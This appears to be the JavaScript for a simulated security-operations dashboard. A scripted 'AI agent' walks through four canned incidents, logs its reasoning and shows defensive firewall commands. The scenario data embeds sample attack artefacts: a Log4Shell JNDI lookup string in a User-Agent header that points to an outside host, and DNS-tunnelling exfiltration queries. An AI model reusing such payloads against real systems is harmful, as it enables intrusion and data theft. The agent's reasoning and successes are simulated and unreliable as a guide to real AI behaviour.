// ---------- Clock ----------
function tickClock() {
  const el = document.getElementById('clock');
  if (el) el.textContent = new Date().toLocaleTimeString('en-GB');
}
setInterval(tickClock, 1000);
tickClock();

// ---------- Real Cybersecurity Incident Scenarios ----------
const SCENARIOS = [
  {
    id: "sc-01",
    timestamp: "",
    severity: "HIGH",
    sevClass: "sev-high",
    srcIp: "10.0.0.142",
    dstIp: "10.0.0.5",
    proto: "TCP/LDAP",
    impactScore: "8.9 / 10",
    signature: "ET POLICY LDAP query brute force attempt",
    tactic: "Credential Access",
    mitreId: "T1110.001",
    summary: "Active LDAP brute-force attack originating from internal build server 10.0.0.142 targeting Domain Controller 10.0.0.5. Source node is testing passwords against service accounts, triggering Active Directory lockout rules.",
    chainOfThought: [
      "Inspecting LDAP traffic on port 389 directed at Domain Controller (10.0.0.5).",
      "Rate-limit exception: Received 142 authentication requests in under 8 seconds from 10.0.0.142.",
      "Parsing credentials: Identification of target account 'svc_build'. Windows event ID 4625 (Logon Failure) detected in system log.",
      "Correlating host type: 10.0.0.142 is registered as an automated Linux build slave. Direct LDAP directory search is anomalous for this profile.",
      "Determining action: Credential stuffing detected. Activating security playbook: Lock Account & Firewall Block."
    ],
    payload: `2026-07-07T12:04:15.823Z DC01.corp Security-Auditing[4625]:
An account failed to log on.
Subject:
  Security ID: S-1-5-18
  Account Name: DC01$
Target Account:
  Account Name: svc_build
  Domain: CORP.INTERNAL
Failure Information:
  Failure Reason: Unknown user name or bad password.
  Status: 0xC000006D
  Sub Status: 0xC000006A
Process Information:
  Caller Process ID: 0x2e4
  Caller Process Name: C:\\Windows\\System32\\lsass.exe`,
    hex: `0000  00 15 5d 01 0c 05 00 10  7b 3c 92 f8 08 00 45 00  ..]..... {<....E.
0010  00 a8 c2 a1 40 00 40 06  e3 1a 0a 00 00 8e 0a 00  ....@.@. ........
0020  00 05 a1 e1 01 85 5a 91  c4 3b 1e 32 a4 11 80 18  ......Z. .;.2....
0030  01 f5 b4 ad 00 00 01 01  08 0a c6 e7 e8 b1 00 11  ........ ........
0040  30 4b 02 01 01 60 46 02  01 03 04 25 75 69 64 3d  0K...\`F. ...%uid=
0050  73 76 63 5f 62 75 69 6c  64 2c 6f 75 3d 73 65 72  svc_buil d,ou=ser
0060  76 69 63 65 73 2c 64 63  3d 63 6f 72 70 80 1a 70  vices,dc =corp..p
0070  61 73 73 77 6f 72 64 31  32 33 34 35 36 21 21 21  assword1 23456!!!`,
    playbookName: "pb-revoke",
    command: "net user svc_build /active:no /domain && iptables -I INPUT -s 10.0.0.142 -j DROP",
    playbookStatus: "Revoked AD Credentials & Isolated Ubuntu server 10.0.0.142 successfully. Incident closed."
  },
  {
    id: "sc-02",
    timestamp: "",
    severity: "HIGH",
    sevClass: "sev-high",
    srcIp: "10.0.0.88",
    dstIp: "8.8.8.8",
    proto: "UDP/DNS",
    impactScore: "9.4 / 10",
    signature: "ET TROJAN DNS Tunneling Subdomain Query (txt record)",
    tactic: "Exfiltration",
    mitreId: "T1071.004",
    summary: "Suspicious DNS query volume detected from Windows Engineering Station 10.0.0.88. High-entropy payloads encoded in subdomain strings requesting TXT records indicate active DNS Tunneling for data exfiltration.",
    chainOfThought: [
      "Analyzing UDP queries to external resolver 8.8.8.8 on port 53.",
      "Anomaly identified: Host 10.0.0.88 transmitted 14,000 subdomains to 'malicious-domain.com' within 2 minutes.",
      "Inspecting payload entropy: Entropy value is 6.82 (extremely high, indicative of encrypted/compressed text).",
      "Analyzing decoded queries: Pattern matches base64 structure. Partial block contains string header: 'CONFIDENTIAL_DESIGNS'.",
      "Action triggered: Data exfiltration attempt in progress. Deploying host isolation rule on boundary firewall."
    ],
    payload: `2026-07-07T12:06:33.109Z DNS-Resolver queries:
client 10.0.0.88#53229 (exfil.malicious-domain.com): query:
  5a6662306339326162393066316233.exfil.malicious-domain.com IN TXT + (10.0.0.88)
client 10.0.0.88#53229 (exfil.malicious-domain.com): query:
  6865616465727f3938663030316132.exfil.malicious-domain.com IN TXT + (10.0.0.88)
client 10.0.0.88#53229 (exfil.malicious-domain.com): query:
  303964657369676e735f7064665f65.exfil.malicious-domain.com IN TXT + (10.0.0.88)`,
    hex: `0000  00 0c 29 e4 ad da 00 10  7b 3c 92 f8 08 00 45 00  ..)..... {<....E.
0010  00 d4 a1 b2 40 00 40 11  d2 a4 0a 00 00 58 08 08  ....@.@. .....X..
0020  08 08 c0 5d 00 35 00 c0  22 f9 a8 a2 01 00 00 01  ...].5.. ".......
0030  00 00 00 00 00 00 1e 35  61 36 36 36 32 33 30 36  .......5 a6662306
0040  33 33 39 33 32 36 31 36  32 33 39 30 36 36 33 33  33932616 23906633
0050  2e 65 78 66 69 6c 2d 6d  61 6c 69 63 69 6f 75 73  .exfil-m alicious
0060  2d 64 6f 6d 61 69 6e 2e  63 6f 6d 00 00 10 00 01  -domain. com.....`,
    playbookName: "pb-quarantine",
    command: "iptables -I FORWARD -s 10.0.0.88 -p udp --dport 53 -j DROP && echo 'Blocked 10.0.0.88 DNS Outbound'",
    playbookStatus: "Host 10.0.0.88 DNS exfiltration channel quarantined. Internal traffic routed to sandbox."
  },
  {
    id: "sc-03",
    timestamp: "",
    severity: "HIGH",
    sevClass: "sev-high",
    srcIp: "185.220.101.9",
    dstIp: "10.0.0.22",
    proto: "TCP/HTTP",
    impactScore: "10.0 / 10",
    signature: "ET EXPLOIT Apache Log4j RCE Attempt (CVE-2021-44228)",
    tactic: "Initial Access",
    mitreId: "T1190",
    summary: "Remote Code Execution exploit payload targeting internal Apache server 10.0.0.22. Source IP is a verified Tor Exit Node attempting JNDI LDAP lookup injection via User-Agent HTTP header.",
    chainOfThought: [
      "Analyzing incoming HTTP GET packet to web application server (10.0.0.22).",
      "Scanning HTTP headers. Pattern matched: presence of lookup syntax '\${jndi:ldap://...' in User-Agent.",
      "Extracting lookup destination: Host requests remote class file from active rogue host 185.220.101.9 on port 1389.",
      "Querying internal IP threat intelligence database: Source IP 185.220.101.9 flagged as Tor Exit Node with multiple vulnerability scan reports.",
      "Action decided: Critical remote execution exploit blocked. Deploying edge-filter rule to block attacker IP globally."
    ],
    payload: `GET /login HTTP/1.1
Host: web.corp.internal
User-Agent: \${jndi:ldap://185.220.101.9:1389/a}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: close
Upgrade-Insecure-Requests: 1`,
    hex: `0000  00 50 56 b4 82 f1 00 10  7b 3c 92 f8 08 00 45 00  .PV..... {<....E.
0010  01 80 43 f1 40 00 3a 06  b1 28 b9 dc 65 09 0a 00  ..C.@.:. (..e...
0020  00 16 01 bb 00 50 d4 92  ef a1 c2 ad 90 f8 80 18  .....P.. ........
0030  01 f5 f0 da 00 00 47 45  54 20 2f 6c 6f 67 69 6e  ......GE T /login
0040  20 48 54 54 50 2f 31 2e  31 0d 0a 48 6f 73 74 3a   HTTP/1. 1..Host:
0050  24 7b 6a 6e 64 69 3a 6c  64 61 70 3a 2f 2f 31 38  \${jndi:l dap://18
0060  35 2e 32 32 30 2e 31 30  31 2e 39 3a 31 33 38 39  5.220.10 1.9:1389
0070  2f 61 7d 0d 0a 43 6f 6e  6e 65 63 74 69 6f 6e 3a  /a}..Con nection:`,
    playbookName: "pb-blockip",
    command: "iptables -I INPUT -s 185.220.101.9 -j DROP && ufw deny from 185.220.101.9",
    playbookStatus: "Attacker IP 185.220.101.9 blocked on boundary interfaces. Intrusion thwarted."
  },
  {
    id: "sc-04",
    timestamp: "",
    severity: "MEDIUM",
    sevClass: "sev-med",
    srcIp: "198.51.100.41",
    dstIp: "10.0.0.8",
    proto: "TCP/SYN",
    impactScore: "5.4 / 10",
    signature: "ET SCAN Nmap TCP Sweep",
    tactic: "Reconnaissance",
    mitreId: "T1046",
    summary: "Reconnaissance port sweep detected from external host 198.51.100.41. The host is sending rapid TCP SYN probes targeting network assets to locate active listening TCP ports.",
    chainOfThought: [
      "Analyzing boundary connection logs. High frequency of connections targeting port range 21 to 8080.",
      "Flags observed: TCP SYN sequence generated without ACK or PSH flags. Matches classic SYN stealth scanning profile.",
      "Calculating threshold rate: IP 198.51.100.41 scanned 42 distinct sockets in 0.84 seconds.",
      "Verifying host vulnerability: Target host 10.0.0.8 has firewall rules configured; 99% of scanned sockets dropped successfully.",
      "Mitigation protocol: IP matches external recon scan. Applying rate limiter to scanning source to prevent DoS side-effects."
    ],
    payload: `2026-07-07T12:11:07.411Z FIREWALL-LOG:
Inbound Packet Dropped: IN=eth0 OUT= MAC=00:15:5d:01:0c:05:00:10 SRC=198.51.100.41 DST=10.0.0.8
  LEN=40 TOS=0x00 PREC=0x00 TTL=52 ID=49211 PROTO=TCP SPT=48892 DPT=23 SEQ=29841276 ACK=0 WINDOW=1024 SYN`,
    hex: `0000  00 15 5d 01 0c 05 00 10  7b 3c 92 f8 08 00 45 00  ..]..... {<....E.
0010  00 28 c0 3b 40 00 34 06  a2 b1 c6 33 64 29 0a 00  .(.;@.4. ...3d)..
0020  00 08 bf c0 00 17 01 c7  4e 9c 00 00 00 00 50 02  ........ N.....P.
0030  04 00 a3 a2 00 00 02 04  05 b4 01 01 04 02 01 03  ........ ........`,
    playbookName: "pb-blockip",
    command: "iptables -A INPUT -s 198.51.100.41 -m limit --limit 2/min -j ACCEPT",
    playbookStatus: "Scan source rate-limited. Scanning activity monitored."
  }
];

// ---------- Global State Management ----------
let totalAlerts = 0;
let blockedRequests = 0;
let currentRole = "Analyst";
let selectedScenario = null;
let activeScenarioIndex = 0;
let generatedIncidents = [];
let anomalyTimelineData = [10, 12, 8, 14, 9, 15, 11, 13, 10, 12];
let mitreCounts = {
  "Reconnaissance": 0,
  "Credential Access": 0,
  "Exfiltration": 0,
  "Initial Access": 0
};

// ---------- Chart.js Initialization ----------
let firewallChart = null;
let attackChart = null;

function initCharts() {
  const fwCtx = document.getElementById('firewallChart');
  if (fwCtx) {
    firewallChart = new Chart(fwCtx, {
      type: 'doughnut',
      data: {
        labels: ['Filtered', 'Open'],
        datasets: [{
          data: [98.5, 1.5],
          backgroundColor: ['#3ed9c5', '#1a222e'],
          borderColor: '#12161d',
          borderWidth: 2
        }]
      },
      options: {
        cutout: '76%',
        plugins: { legend: { display: false } },
        animation: { duration: 400 }
      }
    });
  }

  const atCtx = document.getElementById('attackChart');
  if (atCtx) {
    attackChart = new Chart(atCtx, {
      type: 'line',
      data: {
        labels: ['', '', '', '', '', '', '', '', '', ''],
        datasets: [{
          data: anomalyTimelineData,
          borderColor: '#ffb627',
          backgroundColor: 'rgba(255,182,39,0.05)',
          borderWidth: 2,
          pointRadius: 2,
          tension: 0.3,
          fill: true
        }]
      },
      options: {
        responsive: true,
        maintainAspectRatio: false,
        plugins: { legend: { display: false } },
        scales: {
          x: { display: false },
          y: {
            min: 0,
            max: 100,
            ticks: { color: '#4d5765', font: { family: 'IBM Plex Mono', size: 9 } },
            grid: { color: '#1a222e' }
          }
        }
      }
    });
  }
}

// ---------- Anomaly & MITRE Heatmap Dynamic Updaters ----------
const MITRE_MAPPINGS = [
  { tactic: "Reconnaissance", name: "T1046 Network Scanning" },
  { tactic: "Credential Access", name: "T1110.001 AD Brute Force" },
  { tactic: "Exfiltration", name: "T1071.004 DNS Tunneling" },
  { tactic: "Initial Access", name: "T1190 Web Exploit" }
];

function buildMitreGrid() {
  const grid = document.getElementById('mitreGrid');
  if (!grid) return;
  grid.innerHTML = "";
  
  MITRE_MAPPINGS.forEach(item => {
    const hits = mitreCounts[item.tactic] || 0;
    const cell = document.createElement('div');
    cell.className = 'mitre-cell';
    
    if (hits > 2) cell.className += ' hit-high';
    else if (hits > 1) cell.className += ' hit-med';
    else if (hits > 0) cell.className += ' hit-low';
    
    cell.innerHTML = `
      <span class="tact">${item.tactic}</span>
      <span class="tech">${item.name}</span>
      <span class="count">${hits} observed</span>
    `;
    grid.appendChild(cell);
  });
}

function updateAnomalyChart(isSpike) {
  if (!attackChart) return;
  
  anomalyTimelineData.shift();
  if (isSpike) {
    anomalyTimelineData.push(Math.floor(Math.random() * 20) + 80); // Dynamic Spike
  } else {
    anomalyTimelineData.push(Math.floor(Math.random() * 8) + 8); // Base baseline
  }
  
  attackChart.data.datasets[0].data = anomalyTimelineData;
  attackChart.update('none');
}

// ---------- AI Agent Execution Engine ----------
const agentConsole = document.getElementById('agentConsole');
const agentState = document.getElementById('agentState');
const agentEps = document.getElementById('agentEps');
const agentMem = document.getElementById('agentMem');

function logToConsole(text, type = "system") {
  if (!agentConsole) return;
  const line = document.createElement('div');
  line.className = `console-line ${type}`;
  line.textContent = `[${new Date().toLocaleTimeString('en-GB')}] ${text}`;
  agentConsole.appendChild(line);
  agentConsole.scrollTop = agentConsole.scrollHeight;
}

function updateAgentState(stateText, stateClass = "") {
  if (!agentState) return;
  
  if (stateClass === "pulse-red") {
    agentState.innerHTML = `<span class="p-dot" style="background:var(--red); box-shadow:0 0 8px var(--red);"></span> ${stateText}`;
    agentState.style.color = "var(--red)";
  } else if (stateClass === "amber") {
    agentState.innerHTML = `<span class="p-dot" style="background:var(--amber); box-shadow:0 0 8px var(--amber);"></span> ${stateText}`;
    agentState.style.color = "var(--amber)";
  } else {
    agentState.innerHTML = `<span class="p-dot"></span> ${stateText}`;
    agentState.style.color = "var(--cyan)";
  }
}

// Resets all playbooks visual state in sidebar
function resetPlaybooksVisual() {
  document.querySelectorAll('.playbook-status').forEach(el => {
    el.className = "playbook-status idle";
    el.textContent = "Idle";
  });
}

// Simulate AI processing of a scenario
function processScenario(scenario) {
  // 1. Set Agent state to reasoning
  updateAgentState("THINKING", "amber");
  resetPlaybooksVisual();
  
  // Update EPS and memory load indicators
  if (agentEps) agentEps.textContent = `${(Math.random() * 10 + 25).toFixed(1)} /s`;
  if (agentMem) agentMem.textContent = `${(Math.random() * 4 + 12).toFixed(1)}%`;
  
  // Set global threat indicators
  const statusPill = document.getElementById('globalStatus');
  if (statusPill) {
    statusPill.className = "status-pill red-alert";
    statusPill.innerHTML = `<span class="p-dot"></span> DETECTING THREAT`;
  }
  
  logToConsole(`ALERT DISPATCH: Signature '${scenario.signature}' matching...`, "system");
  
  // Step-by-step typewriter chain of thought logging
  let logStep = 0;
  function printNextCoT() {
    if (logStep < scenario.chainOfThought.length) {
      logToConsole(scenario.chainOfThought[logStep], "thinking");
      logStep++;
      setTimeout(printNextCoT, 1400);
    } else {
      // Completed thinking -> Trigger mitigation
      executeMitigation(scenario);
    }
  }
  
  setTimeout(printNextCoT, 800);
}

function executeMitigation(scenario) {
  updateAgentState("RESPONDING", "pulse-red");
  logToConsole(`DECISION: Deploying playbook mitigation command...`, "detection");
  
  // Mark playbook item as active
  const pbStatus = document.getElementById(scenario.playbookName);
  if (pbStatus) {
    pbStatus.className = "playbook-status active";
    pbStatus.textContent = "Deploying";
  }
  
  setTimeout(() => {
    // Execution completed
    logToConsole(`PLAYBOOK EXECUTION LOG: ${scenario.command}`, "action");
    logToConsole(`STATUS: [SUCCESS] Mitigation deployed. Host container isolated.`, "action");
    
    if (pbStatus) {
      pbStatus.className = "playbook-status executed";
      pbStatus.textContent = "Deployed";
    }
    
    // Increment telemetry statistics
    totalAlerts++;
    blockedRequests++;
    mitreCounts[scenario.tactic] = (mitreCounts[scenario.tactic] || 0) + 1;
    
    // Add row to UI alert feed
    pushAlertToFeed(scenario);
    
    // Redraw charts
    updateAnomalyChart(true);
    buildMitreGrid();
    
    // Reset indicators back to monitoring
    updateAgentState("MONITORING");
    if (agentEps) agentEps.textContent = `${(Math.random() * 3 + 10).toFixed(1)} /s`;
    if (agentMem) agentMem.textContent = `${(Math.random() * 0.8 + 2.0).toFixed(1)}%`;
    
    const statusPill = document.getElementById('globalStatus');
    if (statusPill) {
      statusPill.className = "status-pill";
      statusPill.innerHTML = `<span class="p-dot"></span> Firewall &amp; Agent Guard Active`;
    }
    
    document.getElementById('statBlocked').textContent = blockedRequests;
  }, 2200);
}

// ---------- Feed Management ----------
const feed = document.getElementById('alertFeed');
const countTag = document.getElementById('alertCount');

function pushAlertToFeed(scenario) {
  if (!feed) return;
  
  // Store instance with an accurate current timestamp
  const incident = {
    ...scenario,
    timestamp: new Date().toLocaleTimeString('en-GB')
  };
  generatedIncidents.unshift(incident);
  
  const row = document.createElement('div');
  row.className = 'alert-row';
  row.id = `row-${incident.id}-${totalAlerts}`;
  row.innerHTML = `
    <span class="t">${incident.timestamp}</span>
    <span class="sev ${incident.sevClass}">${incident.severity}</span>
    <span class="src-ip">${incident.srcIp}</span>
    <span class="msg">${incident.signature}</span>
    <span class="ai-tag mitigated">Mitigated</span>
  `;
  
  // Set drawer click trigger
  row.addEventListener('click', () => {
    // Clear selection on other rows
    document.querySelectorAll('.alert-row').forEach(r => r.classList.remove('selected'));
    row.classList.add('selected');
    openForensicDrawer(incident);
  });
  
  feed.prepend(row);
  
  // Cap feed size
  while (feed.children.length > 50) {
    feed.removeChild(feed.lastChild);
    generatedIncidents.pop();
  }
  
  if (countTag) countTag.textContent = `${totalAlerts} alerts`;
}

// ---------- Forensic Slide-Out Drawer Interactivity ----------
const forensicDrawer = document.getElementById('forensicDrawer');
const drawerBackdrop = document.getElementById('drawerBackdrop');
const drawerClose = document.getElementById('drawerClose');

function openForensicDrawer(incident) {
  if (!forensicDrawer || !drawerBackdrop) return;
  
  selectedScenario = incident;
  
  // Populate Fields
  document.getElementById('drawerTitle').textContent = `Investigation: ${incident.id.toUpperCase()}`;
  document.getElementById('fd-src').textContent = incident.srcIp;
  document.getElementById('fd-dst').textContent = incident.dstIp;
  document.getElementById('fd-proto').textContent = incident.proto;
  document.getElementById('fd-score').textContent = incident.impactScore;
  
  // Obfuscate / filter based on Guest/Viewer role
  if (currentRole === "Viewer") {
    document.getElementById('fd-src').textContent = "[REDACTED]";
    document.getElementById('fd-dst').textContent = "[REDACTED]";
    document.getElementById('fd-ai-summary').textContent = "Access denied: Guest Viewer permissions are insufficient to view threat analytics payloads.";
    document.getElementById('fd-ai-cot').textContent = "// THREAT ANALYTICS BLOCKED";
    document.getElementById('fd-log').textContent = "[PAYLOAD BLOCKED]";
    document.getElementById('fd-hex').textContent = "0000  XX XX XX XX XX XX XX XX  XX XX XX XX XX XX XX XX";
    document.getElementById('fd-mit-status').textContent = "Action logs restricted.";
    document.getElementById('fd-mit-command').textContent = "sudo block --restricted";
  } else {
    document.getElementById('fd-ai-summary').textContent = incident.summary;
    document.getElementById('fd-ai-cot').innerHTML = incident.chainOfThought.map(line => `&gt; ${line}`).join('<br><br>');
    document.getElementById('fd-log').textContent = incident.payload;
    document.getElementById('fd-hex').textContent = incident.hex;
    document.getElementById('fd-mit-status').textContent = incident.playbookStatus;
    document.getElementById('fd-mit-command').textContent = incident.command;
  }
  
  // Reset tabs to default (AI tab)
  switchDrawerTab('tab-ai');
  
  // Active classes
  forensicDrawer.classList.add('open');
  drawerBackdrop.classList.add('active');
}

function closeForensicDrawer() {
  if (!forensicDrawer || !drawerBackdrop) return;
  forensicDrawer.classList.remove('open');
  drawerBackdrop.classList.remove('active');
  document.querySelectorAll('.alert-row').forEach(r => r.classList.remove('selected'));
  selectedScenario = null;
}

if (drawerClose) drawerClose.addEventListener('click', closeForensicDrawer);
if (drawerBackdrop) drawerBackdrop.addEventListener('click', closeForensicDrawer);

// Tab switching inside drawer
function switchDrawerTab(tabId) {
  document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
  document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
  
  // Find button by target tab ID mapping
  let btnId = 'btn-' + tabId;
  const btn = document.getElementById(btnId);
  if (btn) btn.classList.add('active');
  
  const content = document.getElementById(tabId);
  if (content) content.classList.add('active');
}

// ---------- Role-Based Access Control (RBAC) ----------
const roleSelect = document.getElementById('roleSelect');
const rbacVal = document.getElementById('rbacVal');
const rbacNote = document.getElementById('rbacNote');
const roleTag = document.getElementById('roleTag');

const ROLE_COPY = {
  Analyst: {
    val: 'analyst · read-only alerts',
    note: 'Analysts can view live alerts and MITRE mappings but cannot change firewall rules. Switch role above to see access change.'
  },
  Admin: {
    val: 'admin · full control',
    note: 'Admins have full visibility and can manually inject custom firewall overrides or execute containment playbooks from the action terminal.'
  },
  Viewer: {
    val: 'viewer · encrypted / masked views',
    note: 'Guest viewers are restricted. All raw packet fields, exfiltration content, and command telemetry details are redacted for privacy.'
  }
};

if (roleSelect) {
  roleSelect.addEventListener('change', () => {
    currentRole = roleSelect.value;
    const copy = ROLE_COPY[currentRole];
    
    if (rbacVal) rbacVal.textContent = copy.val;
    if (rbacNote) rbacNote.textContent = copy.note;
    if (roleTag) roleTag.textContent = `role: ${currentRole.toLowerCase()}`;
    
    const feedContainer = document.getElementById('alertFeed');
    if (feedContainer) {
      if (currentRole === 'Viewer') {
        feedContainer.style.filter = 'blur(1px)';
      } else {
        feedContainer.style.filter = 'none';
      }
    }
    
    // Re-populate drawer if it is currently open to reflect updated permissions
    if (selectedScenario) {
      openForensicDrawer(selectedScenario);
    }
  });
}

// ---------- Telemetry Looper Loop ----------
function runTelemetryLoop() {
  // Trigger a baseline anomaly tick
  updateAnomalyChart(false);
  
  // Trigger new incident process at intervals
  const nextScenario = SCENARIOS[activeScenarioIndex];
  processScenario(nextScenario);
  
  // Cycle index
  activeScenarioIndex = (activeScenarioIndex + 1) % SCENARIOS.length;
}

// Seeding standard alerts
function seedFeed() {
  for (let i = 0; i < 4; i++) {
    const sc = SCENARIOS[i];
    totalAlerts++;
    blockedRequests += Math.floor(Math.random() * 2) + 1;
    mitreCounts[sc.tactic] = (mitreCounts[sc.tactic] || 0) + 1;
    pushAlertToFeed(sc);
  }
  
  buildMitreGrid();
  if (document.getElementById('statBlocked')) {
    document.getElementById('statBlocked').textContent = blockedRequests;
  }
}

// Initialize on page load
window.addEventListener('DOMContentLoaded', () => {
  initCharts();
  seedFeed();
  
  // Start the threat generation loop
  // Each scenario cycle takes approx 15 seconds (including CoT delays)
  setInterval(runTelemetryLoop, 15000);
  
  // Initial run
  setTimeout(runTelemetryLoop, 2000);
});
